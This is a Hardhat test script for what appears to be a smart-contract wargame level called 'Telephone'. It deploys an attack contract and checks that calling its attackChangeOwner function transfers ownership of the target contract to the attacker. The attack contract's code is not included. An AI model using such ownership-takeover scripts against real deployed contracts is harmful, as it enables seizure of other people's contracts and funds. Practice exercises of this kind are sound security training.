const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Telephone Attack", () => {
    let deployer;
    let telephone, telephoneAttack;

    const INSTANCE_ADDRESS = "0x39047747E8Bc9249ac2Bb84191E14caC0CAC0b06";

    beforeEach(async () => {
        // Setup accounts
        [deployer] = await ethers.getSigners();

        // Fetch instance contract
        telephone = await hre.ethers.getContractAt("Telephone", INSTANCE_ADDRESS);

        // Deploy attack contract
        const TelephoneAttack = await ethers.getContractFactory("TelephoneAttack");
        telephoneAttack = await TelephoneAttack.deploy(INSTANCE_ADDRESS);
    })

    describe("Telephone", async () => {
        it("Returns the current owner", async () => {
            const result = await telephone.owner();
            expect(result).to.not.equal(deployer.address);
        })
    })

    describe("Telephone Attack", async () => {
        it("Returns the new owner", async () => {
            const transaction = await telephoneAttack.connect(deployer).attackChangeOwner(deployer.address);
            await transaction.wait();

            const result = await telephone.owner();
            expect(result).to.equal(deployer.address);
        })
    })
})
